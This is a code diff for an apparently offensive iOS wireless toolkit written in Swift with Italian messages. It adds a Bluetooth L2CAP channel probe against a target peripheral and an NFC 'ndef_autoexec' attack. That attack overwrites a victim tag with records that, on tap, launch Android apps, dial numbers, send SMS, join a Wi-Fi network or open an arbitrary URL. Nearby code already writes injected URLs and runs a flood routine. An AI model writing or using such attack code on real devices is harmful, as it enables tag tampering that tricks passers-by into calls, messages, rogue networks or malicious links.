@@ -135,6 +135,10 @@ final class BLEScanner: NSObject, CBCentralManagerDelegate, CBPeripheralDelegate
     }
 
     func centralManager(_ central: CBCentralManager, didConnect peripheral: CBPeripheral) {
+        if l2capCont != nil, let psm = pendingPsm {
+            peripheral.openL2CAPChannel(psm)
+            return
+        }
         peripheral.discoverServices(nil)
     }
 
@@ -241,18 +245,54 @@ final class BLEScanner: NSObject, CBCentralManagerDelegate, CBPeripheralDelegate
 
     private var floodCont: (() -> Void)?
 
+    // L2CAP credit-based channel reach: openL2CAPChannel su PSM vendor
+    private var l2capCont: ((String) -> Void)?
+    private var pendingPsm: UInt16?
+
+    func l2capProbe(_ target: TargetDevice, psm: UInt16) async -> String {
+        guard central.state == .poweredOn,
+              let per = peripherals[target.mac ?? ""] else { return "peripheral non in range/cache" }
+        pendingPsm = psm
+        return await withCheckedContinuation { cont in
+            l2capCont = { cont.resume(returning: $0) }
+            per.delegate = self
+            central.connect(per, options: nil)
+            DispatchQueue.main.asyncAfter(deadline: .now() + 8) { [weak self, weak per] in
+                guard let self, let per else { return }
+                if self.l2capCont != nil {
+                    self.l2capCont?("timeout — PSM probabilmente chiuso o non CoC")
+                    self.l2capCont = nil
+                    self.central.cancelPeripheralConnection(per)
+                }
+            }
+        }
+    }
+
     func centralManager(_ central: CBCentralManager, didDisconnectPeripheral peripheral: CBPeripheral, error: Error?) {
         finishEnum()
         writeCont?("disconnected — write outcome unknown")
         writeCont = nil
         floodCont?()
         floodCont = nil
+        l2capCont?("disconnesso — canale chiuso")
+        l2capCont = nil
     }
 
     func centralManager(_ central: CBCentralManager, didFailToConnect peripheral: CBPeripheral, error: Error?) {
         finishEnum()
         writeCont?("connect failed: \(error?.localizedDescription ?? "?")")
         writeCont = nil
+        l2capCont?("connect fallito: \(error?.localizedDescription ?? "?")")
+        l2capCont = nil
+    }
+
+    func peripheral(_ peripheral: CBPeripheral, didOpen channel: CBL2CAPChannel?, error: Error?) {
+        if channel != nil {
+            l2capCont?("canale COC APERTO — profilo proprietario raggiunto (reach confermato)")
+        } else {
+            l2capCont?("open fallito: \(error?.localizedDescription ?? "?")")
+        }
+        l2capCont = nil
     }
 
     private func propsText(_ p: CBCharacteristicProperties) -> String {
@@ -792,6 +832,44 @@ final class NFCScanner: NSObject, NFCNDEFReaderSessionDelegate, NFCTagReaderSess
                     lines.append("write FAIL: \(err.localizedDescription)")
                 } else {
                     lines.append("NDEF INJECTED ✓ — il tag ora serve l'URL (auto-open su Android)")
+                }
+                self?.finishAttack(lines)
+            }
+        case "ndef_autoexec":
+            let kind = cfg["kind"] ?? "uri"
+            let value = cfg["value"] ?? ""
+            guard !value.isEmpty else {
+                finishAttack(["valore mancante — scrivi il target dell'auto-exec"]); return
+            }
+            var rec: CoreNFC.NFCNDEFPayload
+            var label: String
+            switch kind {
+            case "aar":
+                rec = CoreNFC.NFCNDEFPayload(format: CoreNFC.NFCTypeNameFormat.nfcExternal,
+                                             type: Data("android.com:pkg".utf8),
+                                             identifier: Data(), payload: Data(value.utf8))
+                label = "AAR lancia app"
+            case "tel":
+                rec = buildURIRecord("tel:\(value)")
+                label = "tel:"
+            case "sms":
+                let p = value.split(separator: ",", maxSplits: 1)
+                rec = buildURIRecord("smsto:\(p.first ?? ""):\(p.count > 1 ? p[1] : "")")
+                label = "smsto:"
+            case "wifi":
+                rec = buildURIRecord(value.hasPrefix("WIFI:") ? value : "WIFI:T:WPA;S:\(value);P:;;")
+                label = "WIFI join"
+            default:
+                rec = buildURIRecord(value)
+                label = "URI"
+            }
+            m.writeNDEF(NFCNDEFMessage(records: [rec])) { [weak self] err in
+                var lines = ["target \(fam) uid=\(m.identifier.hexPreview)",
+                             "auto-exec: \(label) → \(value)"]
+                if let err {
+                    lines.append("write FAIL: \(err.localizedDescription)")
+                } else {
+                    lines.append("AUTO-EXEC ARMATO ✓ — al tocco del tag il device esegue il launch")
                 }
                 self?.finishAttack(lines)
             }
